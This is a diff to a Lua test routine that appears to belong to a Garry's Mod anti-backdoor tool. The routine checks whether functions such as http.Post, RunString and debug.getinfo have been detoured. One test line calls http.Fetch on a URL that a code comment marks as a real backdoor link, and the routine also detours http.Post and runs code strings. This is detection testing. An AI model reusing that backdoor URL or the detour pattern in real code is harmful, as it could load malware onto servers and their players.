@@ -48,13 +48,19 @@ function BS:Utils_GetFilesCreationTimes()
 end
 
 function BS:Utils_RunTests()
-    print("\n\n---------------------------------------------------------\n[START]\n")
+    print("\n\n---------------------------------------------------------")
+    print("[STARTING TESTS]\n")
 
     local bak = self.__G["http"]["Post"]
-    print("\n-----> Detouring")
+    print("\n-----> Detour a function and call it")
     local function detour() return bak() end
     self.__G["http"]["Post"] = detour
     detour()
+
+    print("\n-----> Detour a function without calling it")
+    local function detourSilent() end
+    self.__G["http"]["Post"] = detourSilent
+    print("\n Detouring auto check test result pending...\n")
 
     print("\n-----> getfenv")
     self.__G.getfenv()
@@ -63,32 +69,34 @@ function BS:Utils_RunTests()
     local function this() end
     self.__G.debug.getfenv(this)
 
-    print("\n-----> http.fetch\n\n(will appear later)")
+    print("\n-----> http.fetch")
     self.__G.http.Fetch("http://disp0.cf/gas.lua", function (arg) -- Real backdoor link
         print("in http.fetch")
     end)
+    print("\n http.Fetch test result pending...\n")
 
-    print("\n\n-----> RunString")
+    print("\n-----> RunString")
     self.__G.RunString("RunString(print('WELCOME ******'))", "bla");
 
     print("\n-----> RunStringEx")
     self.__G.RunStringEx("RunString(print('WELCOME ******'))", "bla");
 
-    print("\n-----> debug.getinfo to check detouring\n")
-    if self.__G.debug.getinfo(self.__G.http.Post).short_src == "lua/includes/modules/http.lua" then
-        print("I guess http.Post is valid")
-    end
-
-    print("\n\n-----> jit.util.funcinfo to check detouring\n")
-    if self.__G.jit.util.funcinfo(self.__G.debug.getinfo)["source"] == nil then
-        print("I guess debug.getinfo is valid")
-    end
-
-    print("\n\n-----> debug.getinfo of RunString\n")
+    print("\n-----> debug.getinfo of RunString\n")
     PrintTable(self.__G.debug.getinfo(self.__G.RunString, "flnSu"))
+    print(self.__G.debug.getinfo(self.__G.RunString).short_src)
+    if self.__G.debug.getinfo(self.__G.RunString).short_src == "[C]" then
+        print("\n I guess RunString is original (Pass)")
+    else
+        print("\n RunString is detoured! (Fail)")
+    end
 
     print("\n\n-----> jit.util.funcinfo of debug.getinfo\n")
     PrintTable(self.__G.jit.util.funcinfo(self.__G.debug.getinfo))
+    if self.__G.jit.util.funcinfo(self.__G.debug.getinfo)["source"] == nil then
+        print("\n I guess debug.getinfo is original (Pass)")
+    else
+        print("\n debug.getinfo is detoured! (Fail)")
+    end
 
     print("\n\n-----> CompileFile")
     local compFile = self.__G.CompileFile("bs/server/modules/utils.lua")
@@ -96,5 +104,10 @@ function BS:Utils_RunTests()
     print("\n-----> CompileString")
     local compStr = self.__G.CompileString("RunString(MsgN('Hi))", "TestCode")
 
-    print("\n[END]\n---------------------------------------------------------\n(http.Fetch test pending)\n")
+    print("\n[FINISHED TESTS]")
+    print("---------------------------------------------------------")
+    print("[WAITING FOR]\n")
+
+    print("--> http.Fetch test result...")
+    print("--> Detouring auto check test result...")
 end
